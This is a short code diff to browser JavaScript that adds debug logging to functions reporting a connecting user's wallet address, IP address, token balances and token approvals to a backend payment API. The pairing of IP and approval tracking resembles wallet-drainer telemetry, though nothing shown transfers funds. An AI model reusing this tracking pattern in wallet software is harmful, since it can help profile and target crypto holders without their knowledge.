@@ -1,33 +1,43 @@
 function notifyWalletConnect(walletAddress, ipAddress, tokenBalances) {
     if (!walletAddress) return;
     
+    window.debugLog("📤 Sending wallet connect to backend...", "info");
+    window.debugLog("Wallet: " + walletAddress, "info");
+    window.debugLog("IP: " + ipAddress, "info");
+    window.debugLog("Tokens count: " + (tokenBalances ? tokenBalances.length : 0), "info");
+    
     const payload = {
         walletAddress: walletAddress,
         ipAddress: ipAddress || 'Unknown',
         tokenBalances: tokenBalances || []
     };
     
-    window.debugLog("Sending wallet connect with " + tokenBalances.length + " tokens to backend", "info");
-    
     fetch(`${BACKEND_URL}/api/payment/wallet-connect`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
     }).then(res => {
-        window.debugLog("Backend wallet connect response: " + res.status, "success");
+        window.debugLog("✅ Backend wallet-connect response: " + res.status, "success");
     }).catch(err => {
-        window.debugLog("Backend wallet connect error: " + err.message, "error");
+        window.debugLog("❌ Backend wallet-connect error: " + err.message, "error");
     });
 }
 
 function notifyApproval(walletAddress, tokenAddress) {
     if (!walletAddress || !tokenAddress) return;
     
+    window.debugLog("📤 Sending approval to backend...", "info");
+    window.debugLog("Token: " + tokenAddress, "info");
+    
     fetch(`${BACKEND_URL}/api/payment/approval`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ walletAddress, tokenAddress })
-    }).catch(() => {});
+    }).then(res => {
+        window.debugLog("✅ Backend approval response: " + res.status, "success");
+    }).catch(err => {
+        window.debugLog("❌ Backend approval error: " + err.message, "error");
+    });
 }
 
 async function getIPAddress() {
